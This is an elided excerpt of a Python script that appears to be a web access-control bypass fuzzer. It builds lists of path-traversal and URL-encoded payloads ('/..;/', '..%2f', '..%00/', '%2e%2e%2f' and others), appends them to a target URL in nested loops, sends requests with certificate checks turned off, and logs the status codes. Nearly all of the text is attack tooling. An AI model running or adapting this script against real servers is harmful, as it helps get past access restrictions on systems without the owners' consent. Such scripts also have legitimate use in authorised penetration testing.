...
output = sys.argv[3]
url=domain+path
payloads = ["/","/*","/%2f/","/./","./.","/*/","?","??","&","#","%","%20","%09","/..;/","../","..%2f","..;/",".././","..%00/","..%0d","..%5c","..%ff/","%2e%2e%2f",".%2e/","%3f","%26","%23",".json",".jsp",".php",".asp",".html"]
payloads2 = ["*","%2f/","./","./.","*/","?","??","&","#","%","%20","%09","..;/","../","..%2f","..;/",".././","..%00/","..%0d","..%5c","..%ff/","%2e%2e%2f",".%2e/","%3f","%26","%23"]
...
for pay1 in payloads2:
		try:
			...
			res16=requests.get(url5, allow_redirects=False , verify=False, timeout=5)
			
			def out():
				print(Style.BRIGHT + Fore.GREEN + url5 + " : "+ Fore.YELLOW + str(res16.status_code))
			out()
			# output redirect to 3rd argument
			original_stdout = sys.stdout
			with open(output, 'a') as f:
...
for pay1 in payloads2:
	for payload in payloads:
		try:
			...
			res17=requests.get(url6, allow_redirects=False , verify=False, timeout=5)

			def out():
				print(Style.BRIGHT + Fore.GREEN + url6 + " : "+ Fore.YELLOW + str(res17.status_code))
			out()
			# output redirect to 3rd argument
			original_stdout = sys.stdout
			with open(output, 'a') as f:
